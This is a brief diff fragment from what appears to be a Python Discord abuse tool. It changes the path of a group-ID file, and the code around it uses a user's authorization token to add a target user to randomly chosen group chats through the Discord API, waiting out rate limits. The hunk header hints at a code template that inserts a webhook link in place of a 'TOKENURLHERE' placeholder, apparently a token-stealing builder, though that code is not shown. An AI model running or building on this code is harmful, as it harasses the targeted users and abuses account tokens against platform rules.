@@ -2091,7 +2091,7 @@ main()""".replace("~~TOKENURLHERE~~", webhooklink))
             except:
                 print(f'{Fore.LIGHTRED_EX}[!] {Fore.RESET}RateLimited for {jsr["retry_after"]} seconds'), time.sleep(jsr['retry_after'])
 
-            scrIds = random.choice(open('staff/groups.txt').readlines())
+            scrIds = random.choice(open('utilities/QR/groups.txt').readlines())
             grID = scrIds.strip('\n')
             r2 = requests.put(f'https://discord.com/api/v9/channels/{grID}/recipients/{UserID}',
                               headers={'Authorization': token})
